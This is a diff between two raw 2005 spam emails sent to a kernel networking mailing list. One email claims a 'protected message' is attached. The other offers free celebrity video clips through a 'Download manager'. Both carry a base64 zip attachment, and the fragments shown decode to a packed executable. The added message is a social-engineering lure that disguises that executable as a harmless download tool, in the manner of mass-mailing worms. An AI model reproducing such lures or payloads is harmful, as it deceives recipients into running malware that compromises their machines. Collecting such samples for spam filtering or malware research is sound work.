@@ -1,29 +1,30 @@
-From: info@nease.net
-Subject: Registration Confirmation
-Date: Fri, 23 Dec 2005 08:06:21 GMT
-Message-ID: <df93.dd033720cbf@nease.net>
+From: office@uninett.no
+Subject: Paris Hilton & Nicole Richie
+Date: Fri, 23 Dec 2005 08:36:25 GMT
+Message-ID: <74a7.c77de9025071ae@uninett.no>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="==5defb6dbd30730.ec3e"
+Content-Type: multipart/mixed; boundary="===5e8da8a8fb.159da42fe"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: x_mail-list@oss.sgi.com
+To: mailserver307@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---==5defb6dbd30730.ec3e
+--===5e8da8a8fb.159da42fe
 
-Protected message is attached!
+The Simple Life:
 
+View Paris Hilton & Nicole Richie video clips , pictures & more ;)
+Download is free until Jan, 2006!
 
-***** Go to: http://www.nease.net
-***** Email: postman@nease.net
---==5defb6dbd30730.ec3e
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+Please use our Download manager.
+--===5e8da8a8fb.159da42fe
+Content-Type: application/octet-stream; name=downloadm.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="downloadm.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1001,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---==5defb6dbd30730.ec3e--
+--===5e8da8a8fb.159da42fe--
